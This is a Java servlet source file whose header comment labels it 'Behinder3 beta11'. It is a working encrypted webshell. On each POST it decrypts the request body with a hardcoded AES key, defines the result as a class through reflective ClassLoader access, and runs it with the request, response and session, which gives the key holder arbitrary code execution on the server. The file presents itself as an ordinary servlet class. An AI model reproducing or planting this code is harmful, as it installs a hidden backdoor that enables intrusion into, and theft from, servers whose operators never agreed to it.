package com.sorry.bug;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Method;

/**
 * Behinder3 beta11
 * created by 0x22cb7139 on 2021/7/12
 */
public class CustomServlet implements Servlet {
    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        HttpServletResponse rsp = (HttpServletResponse) servletResponse;
        rsp.setHeader("X-Geo-Country","*");
        try {
            if (req.getMethod().equals("POST")) {
                String k = "f5d7aa3ba4929cc1";
                req.getSession().setAttribute("u", k);
                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
                c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"));
                java.util.Map<String, Object> pageContext = new java.util.HashMap<String, Object>();
                pageContext.put("session", req.getSession());
                pageContext.put("request", req);
                pageContext.put("response", rsp);
                java.io.BufferedReader bf = req.getReader();
                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(bf.readLine()));
                String sb = new String(evilClassBytes);
                Method defineclass= ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE,Integer.TYPE);
                defineclass.setAccessible(true);
                Class clazz = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),evilClassBytes,0,evilClassBytes.length);
                Object a = clazz.newInstance();
                a.equals(pageContext);
                return;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}
